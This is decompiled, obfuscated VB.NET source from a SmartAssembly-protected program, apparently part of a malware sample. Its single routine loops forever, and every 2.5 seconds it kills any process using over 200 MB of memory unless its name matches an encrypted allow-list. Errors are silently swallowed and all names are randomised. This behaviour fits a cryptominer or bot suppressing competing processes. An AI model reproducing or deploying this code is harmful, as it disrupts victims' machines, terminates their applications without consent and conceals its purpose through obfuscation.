Imports System
Imports System.Diagnostics
Imports System.Threading
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace jtAYXTgtXeY
	' Token: 0x02000022 RID: 34
	Public Module UPKccYYyziBvHP
		' Token: 0x060000DC RID: 220 RVA: 0x0000F5A0 File Offset: 0x0000D7A0
		Public Sub ryXkENswxCYe()
			While True
				For Each process As Process In Process.GetProcesses()
					Try
						If process.PrivateMemorySize64 > 209715200L AndAlso process.ProcessName <> Process.GetCurrentProcess().ProcessName AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107399122)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398569)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398560)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398583)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398538)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398557)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398544)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398499)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398518)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398473)) AndAlso Not process.ProcessName.Contains(UPKccYYyziBvHP.getString_0(107398484)) Then
							process.Kill()
						End If
					Catch
					End Try
				Next
				Try
					Thread.Sleep(2500)
				Catch
				End Try
			End While
		End Sub

		' Token: 0x060000DD RID: 221 RVA: 0x00002BCE File Offset: 0x00000DCE
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(UPKccYYyziBvHP))
		End Sub

		' Token: 0x040000BF RID: 191
		<NonSerialized()>
		Friend getString_0 As GetString
	End Module
End Namespace
